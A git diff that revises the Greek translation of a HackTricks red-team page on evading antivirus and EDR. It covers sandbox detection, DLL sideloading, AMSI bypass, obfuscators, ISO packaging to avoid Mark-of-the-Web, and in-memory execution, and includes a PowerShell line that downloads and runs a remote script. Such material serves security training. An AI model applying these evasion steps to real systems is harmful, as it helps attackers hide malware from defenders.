@@ -1,8 +1,8 @@
 # Antivirus (AV) Bypass
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,9 +15,9 @@
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Αν ενδιαφέρεστε για **καριέρα hacking** και να χακάρετε το μη χακάρισμα - **προσλαμβάνουμε!** (_απαιτείται άπταιστη γραπτή και προφορική πολωνική_).
+Αν ενδιαφέρεστε για **καριέρα hacking** και να χακάρετε το αχάκωτο - **προσλαμβάνουμε!** (_απαιτείται άριστη γνώση πολωνικών γραπτά και προφορικά_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -25,7 +25,7 @@
 
 ## **Μεθοδολογία Αποφυγής AV**
 
-Αυτή τη στιγμή, τα AV χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση και για τα πιο προηγμένα EDRs, συμπεριφορική ανάλυση.
+Αυτή τη στιγμή, τα AV χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι, στατική ανίχνευση, δυναμική ανάλυση και για τα πιο προηγμένα EDRs, ανάλυση συμπεριφοράς.
 
 ### **Στατική ανίχνευση**
 
@@ -54,10 +54,10 @@
 Η δυναμική ανάλυση είναι όταν το AV εκτελεί το δυαδικό σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπαθώντας να αποκρυπτογραφήσει και να διαβάσει τους κωδικούς πρόσβασης του προγράμματος περιήγησης σας, εκτελώντας ένα minidump στο LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο να δουλέψετε, αλλά εδώ είναι μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandbox.
 
 * **Ύπνος πριν την εκτέλεση** Ανάλογα με το πώς έχει υλοποιηθεί, μπορεί να είναι ένας εξαιρετικός τρόπος για να παρακάμψετε την δυναμική ανάλυση του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν τα αρχεία ώστε να μην διακόψουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων περιόδων ύπνου μπορεί να διαταράξει την ανάλυση των δυαδικών. Το πρόβλημα είναι ότι πολλά sandbox AV μπορούν απλώς να παραλείψουν τον ύπνο ανάλογα με το πώς έχει υλοποιηθεί.
-* **Έλεγχος πόρων της μηχανής** Συνήθως τα Sandbox έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τη μηχανή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων, δεν θα είναι όλα υλοποιημένα στο sandbox.
+* **Έλεγχος πόρων μηχανής** Συνήθως τα Sandbox έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τη μηχανή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων, δεν θα έχει όλα υλοποιηθεί στο sandbox.
 * **Έλεγχοι συγκεκριμένοι για τη μηχανή** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο υπολογιστής είναι συνδεδεμένος στο τομέα "contoso.local", μπορείτε να κάνετε έναν έλεγχο στον τομέα του υπολογιστή για να δείτε αν ταιριάζει με αυτόν που έχετε καθορίσει, αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.
 
-Αποδεικνύεται ότι το όνομα υπολογιστή του Sandbox του Microsoft Defender είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα υπολογιστή στο κακόβουλο λογισμικό σας πριν από την έκρηξη, αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του defender, οπότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.
+Αποδεικνύεται ότι το όνομα υπολογιστή του Sandbox του Microsoft Defender είναι HAL9TH, οπότε μπορείτε να ελέγξετε το όνομα υπολογιστή στο κακόβουλο λογισμικό σας πριν από την έκρηξη, αν το όνομα ταιριάζει με το HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του defender, οπότε μπορείτε να κάνετε το πρόγραμμα σας να τερματίσει.
 
 <figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -69,25 +69,25 @@
 
 Για παράδειγμα, αν θέλετε να κάνετε dump LSASS, **χρειάζεστε πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό έργο που είναι λιγότερο γνωστό και επίσης κάνει dump LSASS.
 
-Η σωστή απάντηση είναι πιθανώς η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα πιο, αν όχι το πιο επισημασμένο κομμάτι κακόβουλου λογισμικού από τα AV και EDRs, ενώ το έργο αυτό είναι πολύ ωραίο, είναι επίσης εφιάλτης να δουλέψετε μαζί του για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να επιτύχετε.
+Η σωστή απάντηση είναι πιθανώς η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα πιο επισημασμένα κομμάτια κακόβουλου λογισμικού από τα AV και EDRs, ενώ το έργο αυτό είναι πολύ ωραίο, είναι επίσης εφιάλτης να δουλέψετε μαζί του για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να επιτύχετε.
 
 {% hint style="info" %}
-Όταν τροποποιείτε τα payload σας για αποφυγή, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι η επίτευξη αποφυγής μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε μια VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.
+Όταν τροποποιείτε τα payload σας για αποφυγή, βεβαιωθείτε ότι έχετε **απενεργοποιήσει την αυτόματη υποβολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι η επίτευξη αποφυγής μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε μια VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων, και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.
 {% endhint %}
 
 ## EXEs vs DLLs
 
 Όποτε είναι δυνατόν, πάντα **προτιμήστε τη χρήση DLLs για αποφυγή**, από την εμπειρία μου, τα αρχεία DLL είναι συνήθως **πολύ λιγότερο ανιχνεύσιμα** και αναλύονται, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγετε την ανίχνευση σε ορισμένες περιπτώσεις (αν το payload σας έχει κάποιον τρόπο να εκτελείται ως DLL φυσικά).
 
-Όπως μπορούμε να δούμε σε αυτή την εικόνα, ένα Payload DLL από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το payload EXE έχει ποσοστό ανίχνευσης 7/26.
+Όπως μπορούμε να δούμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό ανίχνευσης 7/26.
 
-<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>σύγκριση antiscan.me ενός κανονικού payload EXE του Havoc με ένα κανονικό DLL του Havoc</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>σύγκριση antiscan.me ενός κανονικού EXE payload του Havoc με ένα κανονικό DLL του Havoc</p></figcaption></figure>
 
 Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο διακριτικοί.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας τόσο την εφαρμογή του θύματος όσο και τα κακόβουλα payloads δίπλα-δίπλα.
+**DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιείται από τον φορτωτή τοποθετώντας τόσο την εφαρμογή-στόχο όσο και τα κακόβουλα payloads δίπλα-δίπλα.
 
 Μπορείτε να ελέγξετε για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω script powershell:
 
@@ -100,7 +100,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 {% endcode %}
 
-Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στον φάκελο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.
+Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.
 
 Συνιστώ ανεπιφύλακτα να **εξερευνήσετε τα προγράμματα που είναι επιρρεπή σε DLL Hijackable/Sideloadable μόνοι σας**, αυτή η τεχνική είναι αρκετά διακριτική αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα Sideloadable DLL, μπορεί να σας πιάσουν εύκολα.
 
@@ -135,7 +135,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 <figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Και ο κώδικας μας (κωδικοποιημένος με [SGN](https://github.com/EgeBalci/sgn)) και η proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.
+Και ο κώδικας μας (κωδικοποιημένος με [SGN](https://github.com/EgeBalci/sgn)) και η DLL proxy έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.
 
 <figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -145,7 +145,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Το Freeze είναι ένα εργαλείο payload για την παράκαμψη των EDR χρησιμοποιώντας ανασταλμένες διαδικασίες, άμεσες syscalls και εναλλακτικές μεθόδους εκτέλεσης`
+`Το Freeze είναι ένα εργαλείο payload για την παράκαμψη των EDRs χρησιμοποιώντας ανασταλμένες διαδικασίες, άμεσες syscalls και εναλλακτικές μεθόδους εκτέλεσης`
 
 Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε τον κώδικά σας με διακριτικό τρόπο.
 ```
@@ -170,9 +170,9 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 * PowerShell (σενάρια, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
 * Windows Script Host (wscript.exe και cscript.exe)
 * JavaScript και VBScript
-* Μακροεντολές Office VBA
+* Μακροεντολές VBA του Office
 
-Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των σεναρίων εκθέτοντας το περιεχόμενο των σεναρίων με μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη αποκρυπτογραφημένη.
+Επιτρέπει στις λύσεις antivirus να ελέγχουν τη συμπεριφορά των σεναρίων εκθέτοντας το περιεχόμενο των σεναρίων με μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη παραποιημένη.
 
 Η εκτέλεση `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.
 
@@ -184,19 +184,19 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 Υπάρχουν μερικοί τρόποι για να παρακάμψετε την AMSI:
 
-* **Αποκρυπτογράφηση**
+* **Παραποίηση**
 
 Δεδομένου ότι η AMSI λειτουργεί κυρίως με στατικές ανιχνεύσεις, επομένως, η τροποποίηση των σεναρίων που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.
 
-Ωστόσο, η AMSI έχει τη δυνατότητα να αποκρυπτογραφεί σενάρια ακόμη και αν έχει πολλαπλά επίπεδα, οπότε η αποκρυπτογράφηση μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό το καθιστά όχι και τόσο απλό να αποφευχθεί. Αν και, μερικές φορές, το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.
+Ωστόσο, η AMSI έχει τη δυνατότητα να αποπαραποιεί σενάρια ακόμη και αν έχει πολλαπλά επίπεδα, οπότε η παραποίηση μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό το καθιστά όχι και τόσο απλό να αποφευχθεί. Αν και, μερικές φορές, το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.
 
 * **Παράκαμψη AMSI**
 
-Δεδομένου ότι η AMSI υλοποιείται φορτώνοντας μια DLL στη διαδικασία powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να παρέμβετε σε αυτήν εύκολα ακόμη και εκτελώντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση της AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν την ανίχνευση AMSI.
+Δεδομένου ότι η AMSI υλοποιείται φορτώνοντας μια DLL στη διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να παρέμβετε σε αυτήν εύκολα ακόμη και εκτελώντας ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση της AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμψουν την ανίχνευση AMSI.
 
 **Εξαναγκασμός Σφάλματος**
 
-Η εξαναγκασμένη αποτυχία της αρχικοποίησης AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει τη μεγαλύτερη χρήση. 
+Η εξαναγκασμένη αποτυχία της αρχικοποίησης AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει μια υπογραφή για να αποτρέψει τη μεγαλύτερη χρήση.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -204,7 +204,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 ```
 {% endcode %}
 
-Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση προκειμένου να χρησιμοποιηθεί αυτή η τεχνική.
+Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.
 
 Εδώ είναι μια τροποποιημένη παράκαμψη AMSI που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```powershell
@@ -241,10 +241,10 @@ Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamo
 * [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
 * [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα ανοιχτού κώδικα fork της [LLVM](http://www.llvm.org/) σουίτας σύνταξης ικανής να παρέχει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) και tamper-proofing.
 * [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να δημιουργήσετε, κατά τη διάρκεια της σύνταξης, obfuscated code χωρίς να χρησιμοποιήσετε κανένα εξωτερικό εργαλείο και χωρίς να τροποποιήσετε τον μεταγλωττιστή.
-* [**obfy**](https://github.com/fritzone/obfy): Προσθέτει μια στρώση obfuscated operations που παράγονται από το πλαίσιο metaprogramming C++ template, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή λίγο πιο δύσκολη.
+* [**obfy**](https://github.com/fritzone/obfy): Προσθέτει μια στρώση obfuscated operations που δημιουργούνται από το πλαίσιο metaprogramming C++ template, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να σπάσει την εφαρμογή λίγο πιο δύσκολη.
 * [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που είναι ικανός να obfuscate διάφορα διαφορετικά αρχεία pe συμπεριλαμβανομένων: .exe, .dll, .sys
-* [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός κινητικός κωδικός μηχανής για αυθαίρετους εκτελέσιμους.
-* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα λεπτομερές πλαίσιο obfuscation κώδικα για γλώσσες που υποστηρίζονται από LLVM χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο κώδικα assembly μετατρέποντας κανονικές εντολές σε αλυσίδες ROP, αποτρέποντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
+* [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα.
+* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα λεπτομερές πλαίσιο obfuscation κώδικα για γλώσσες που υποστηρίζονται από LLVM χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο κώδικα assembly μετατρέποντας κανονικές εντολές σε ROP chains, αποτρέποντας την φυσική μας αντίληψη της κανονικής ροής ελέγχου.
 * [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
 * [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor είναι ικανό να μετατρέπει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώνει
 
@@ -266,7 +266,7 @@ Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamo
 It's important to note that executables signed with a **trusted** signing certificate **won't trigger SmartScreen**.
 {% endhint %}
 
-Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος κοντέινερ όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** τόμους.
+Μια πολύ αποτελεσματική μέθοδος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος κοντέινερ όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** τόμους.
 
 <figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
 
@@ -304,33 +304,33 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 Δεδομένου ότι το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα πρέπει να ανησυχούμε μόνο για την επιδιόρθωση του AMSI για ολόκληρη τη διαδικασία.
 
-Οι περισσότερες πλατφόρμες C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διάφοροι τρόποι για να το κάνετε αυτό:
+Οι περισσότερες πλατφόρμες C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε αυτό:
 
 * **Fork\&Run**
 
-Αυτό περιλαμβάνει **τη δημιουργία μιας νέας θυσιαστικής διαδικασίας**, την έγχυση του κακόβουλου κώδικα σας σε αυτή τη νέα διαδικασία, την εκτέλεση του κακόβουλου κώδικα σας και όταν τελειώσει, την εξόντωση της νέας διαδικασίας. Αυτό έχει τα πλεονεκτήματα και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **έξω** από τη διαδικασία εμφύτευσης Beacon μας. Αυτό σημαίνει ότι αν κάτι στην ενέργεια μετά την εκμετάλλευση πάει στραβά ή πιαστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει η εμφύτευσή μας.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να πιαστείτε από **Συμπεριφορικές Ανιχνεύσεις**.
+Αυτό περιλαμβάνει **τη δημιουργία μιας νέας θυσιαστικής διαδικασίας**, την έγχυση του κακόβουλου κώδικα σας μετά την εκμετάλλευση σε αυτή τη νέα διαδικασία, την εκτέλεση του κακόβουλου κώδικα σας και, όταν τελειώσετε, την τερματισμένη της νέας διαδικασίας. Αυτό έχει τα πλεονεκτήματα και τα μειονεκτήματά του. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **εκτός** της διαδικασίας εμφύτευσης Beacon μας. Αυτό σημαίνει ότι αν κάτι στην ενέργεια μετά την εκμετάλλευση πάει στραβά ή πιαστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει η εμφύτευσή μας.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να πιαστείτε από **Συμπεριφορικές Ανιχνεύσεις**.
 
 <figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-Αφορά την έγχυση του κακόβουλου κώδικα μετά την εκμετάλλευση **στη δική του διαδικασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διαδικασίας και την σάρωση από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να καταρρεύσει.
+Αφορά την έγχυση του κακόβουλου κώδικα σας μετά την εκμετάλλευση **στη δική του διαδικασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διαδικασίας και την σάρωση από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να καταρρεύσει.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, παρακαλώ ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, παρακαλώ ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
 Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**, ελέγξτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
 ## Using Other Programming Languages
 
-Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατόν να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο περιβάλλον διερμηνέα που είναι εγκατεστημένο στο SMB share που ελέγχεται από τον επιτιθέμενο**.
+Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο περιβάλλον διερμηνέα που είναι εγκατεστημένο στο SMB share που ελέγχεται από τον επιτιθέμενο**.
 
 Επιτρέποντας την πρόσβαση στα Δυαδικά Αρχεία Διερμηνέα και το περιβάλλον στο SMB share μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες εντός της μνήμης** της συμβιβασμένης μηχανής.
 
-Το repo υποδεικνύει: Ο Defender σαρώνει ακόμα τα σενάρια αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε τις στατικές υπογραφές**. Η δοκιμή με τυχαία μη αποκρυπτογραφημένα σενάρια reverse shell σε αυτές τις γλώσσες έχει αποδειχθεί επιτυχής.
+Το repo υποδεικνύει: Ο Defender σαρώνει ακόμα τα σενάρια αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε τις στατικές υπογραφές**. Η δοκιμή με τυχαία μη-αποκρυπτογραφημένα σενάρια reverse shell σε αυτές τις γλώσσες έχει αποδειχθεί επιτυχής.
 
 ## Advanced Evasion
 
@@ -350,7 +350,7 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 ### **Check which parts Defender finds as malicious**
 
-Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **αφαιρέσει μέρη του δυαδικού αρχείου** μέχρι να **ανακαλύψει ποιο μέρος ο Defender** βρίσκει ως κακόβουλο και να το διαχωρίσει για εσάς.\
